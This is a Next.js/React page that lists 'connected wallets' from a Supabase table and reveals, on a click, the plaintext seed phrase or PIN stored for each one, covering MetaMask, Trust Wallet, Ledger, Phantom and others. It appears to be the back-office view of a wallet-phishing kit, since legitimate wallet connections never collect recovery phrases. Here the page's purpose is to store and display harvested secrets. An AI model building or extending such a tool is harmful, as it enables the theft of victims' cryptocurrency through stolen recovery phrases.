"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Eye, EyeOff, Trash2, ArrowLeft } from "lucide-react"
import { createClient } from "@/lib/supabase/client"
import Link from "next/link"

interface WalletData {
  id: string
  wallet_name: string
  wallet_type: string
  seed_phrase?: string
  pin_code?: string
  phrase_length?: number
  created_at: string
}

export default function UserDataPage() {
  const [wallets, setWallets] = useState<WalletData[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [visiblePhrases, setVisiblePhrases] = useState<Set<string>>(new Set())

  useEffect(() => {
    fetchWallets()
  }, [])

  const fetchWallets = async () => {
    try {
      const supabase = createClient()
      const { data, error } = await supabase.from("wallets").select("*").order("created_at", { ascending: false })

      if (error) throw error
      setWallets(data || [])
    } catch (err: any) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  const togglePhraseVisibility = (walletId: string) => {
    const newVisible = new Set(visiblePhrases)
    if (newVisible.has(walletId)) {
      newVisible.delete(walletId)
    } else {
      newVisible.add(walletId)
    }
    setVisiblePhrases(newVisible)
  }

  const deleteWallet = async (walletId: string) => {
    if (!confirm("Are you sure you want to delete this wallet connection?")) {
      return
    }

    try {
      const supabase = createClient()
      const { error } = await supabase.from("wallets").delete().eq("id", walletId)

      if (error) throw error

      // Remove from local state
      setWallets(wallets.filter((w) => w.id !== walletId))
    } catch (err: any) {
      alert("Failed to delete wallet: " + err.message)
    }
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  const getWalletIcon = (walletName: string) => {
    const icons: { [key: string]: string } = {
      Metamask: "🦊",
      "Trust Wallet": "🛡️",
      "Coinbase Wallet": "🔵",
      Ledger: "📱",
      "Trezor Wallet": "🔒",
      "Phantom Wallet": "👻",
      "OKX Wallet": "⚫",
      "Rabby Wallet": "🐰",
      "Uniswap Wallet": "🦄",
      Solflare: "☀️",
      "Magic Eden": "🎭",
      Electrum: "⚡",
    }
    return icons[walletName] || "💼"
  }

  const getWalletColor = (walletName: string) => {
    const colors: { [key: string]: string } = {
      Metamask: "bg-orange-100 text-orange-600 border-orange-200",
      "Trust Wallet": "bg-blue-100 text-blue-600 border-blue-200",
      "Coinbase Wallet": "bg-blue-100 text-blue-600 border-blue-200",
      Ledger: "bg-gray-100 text-gray-600 border-gray-200",
      "Trezor Wallet": "bg-green-100 text-green-600 border-green-200",
      "Phantom Wallet": "bg-purple-100 text-purple-600 border-purple-200",
      "OKX Wallet": "bg-gray-100 text-gray-600 border-gray-200",
      "Rabby Wallet": "bg-blue-100 text-blue-600 border-blue-200",
      "Uniswap Wallet": "bg-pink-100 text-pink-600 border-pink-200",
      Solflare: "bg-yellow-100 text-yellow-600 border-yellow-200",
      "Magic Eden": "bg-purple-100 text-purple-600 border-purple-200",
      Electrum: "bg-blue-100 text-blue-600 border-blue-200",
    }
    return colors[walletName] || "bg-gray-100 text-gray-600 border-gray-200"
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading wallet data...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b">
        <div className="max-w-6xl mx-auto px-4 py-6">
          <div className="flex items-center gap-4">
            <Link href="/">
              <Button variant="ghost" size="sm" className="p-2">
                <ArrowLeft className="w-4 h-4" />
              </Button>
            </Link>
            <div>
              <h1 className="text-2xl font-bold text-gray-900">Connected Wallets</h1>
              <p className="text-gray-600">Manage your wallet connections and data</p>
            </div>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="max-w-6xl mx-auto px-4 py-8">
        {error && (
          <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
            <p className="text-red-600">Error: {error}</p>
          </div>
        )}

        {wallets.length === 0 ? (
          <div className="text-center py-12">
            <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-2xl">💼</span>
            </div>
            <h3 className="text-lg font-medium text-gray-900 mb-2">No wallets connected</h3>
            <p className="text-gray-600 mb-6">Connect your first wallet to get started</p>
            <Link href="/">
              <Button className="bg-blue-600 hover:bg-blue-700 text-white">Connect Wallet</Button>
            </Link>
          </div>
        ) : (
          <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
            {wallets.map((wallet) => (
              <Card key={wallet.id} className="relative">
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div
                        className={`w-10 h-10 rounded-lg flex items-center justify-center ${getWalletColor(wallet.wallet_name)}`}
                      >
                        <span className="text-lg">{getWalletIcon(wallet.wallet_name)}</span>
                      </div>
                      <div>
                        <CardTitle className="text-lg">{wallet.wallet_name}</CardTitle>
                        <Badge variant="secondary" className="text-xs">
                          {wallet.wallet_type === "seed_phrase" ? "Seed Phrase" : "PIN Code"}
                        </Badge>
                      </div>
                    </div>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => deleteWallet(wallet.id)}
                      className="text-red-600 hover:text-red-700 hover:bg-red-50"
                    >
                      <Trash2 className="w-4 h-4" />
                    </Button>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Wallet Data */}
                  {wallet.wallet_type === "seed_phrase" && wallet.seed_phrase && (
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <label className="text-sm font-medium text-gray-700">
                          Seed Phrase ({wallet.phrase_length} words)
                        </label>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => togglePhraseVisibility(wallet.id)}
                          className="p-1"
                        >
                          {visiblePhrases.has(wallet.id) ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </Button>
                      </div>
                      <div className="p-3 bg-gray-50 rounded-lg border">
                        <p className="text-sm font-mono break-all">
                          {visiblePhrases.has(wallet.id) ? wallet.seed_phrase : "•".repeat(wallet.seed_phrase.length)}
                        </p>
                      </div>
                    </div>
                  )}

                  {wallet.wallet_type === "pin" && wallet.pin_code && (
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <label className="text-sm font-medium text-gray-700">PIN Code</label>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => togglePhraseVisibility(wallet.id)}
                          className="p-1"
                        >
                          {visiblePhrases.has(wallet.id) ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </Button>
                      </div>
                      <div className="p-3 bg-gray-50 rounded-lg border">
                        <p className="text-sm font-mono text-center tracking-widest">
                          {visiblePhrases.has(wallet.id) ? wallet.pin_code : "•".repeat(wallet.pin_code.length)}
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Connection Date */}
                  <div className="pt-2 border-t">
                    <p className="text-xs text-gray-500">Connected on {formatDate(wallet.created_at)}</p>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}

        {/* Summary Stats */}
        {wallets.length > 0 && (
          <div className="mt-8 p-6 bg-white rounded-lg border">
            <h3 className="text-lg font-medium text-gray-900 mb-4">Summary</h3>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <div className="text-center">
                <div className="text-2xl font-bold text-blue-600">{wallets.length}</div>
                <div className="text-sm text-gray-600">Total Wallets</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-green-600">
                  {wallets.filter((w) => w.wallet_type === "seed_phrase").length}
                </div>
                <div className="text-sm text-gray-600">Seed Phrase</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-orange-600">
                  {wallets.filter((w) => w.wallet_type === "pin").length}
                </div>
                <div className="text-sm text-gray-600">PIN Code</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-purple-600">
                  {new Set(wallets.map((w) => w.wallet_name)).size}
                </div>
                <div className="text-sm text-gray-600">Unique Types</div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
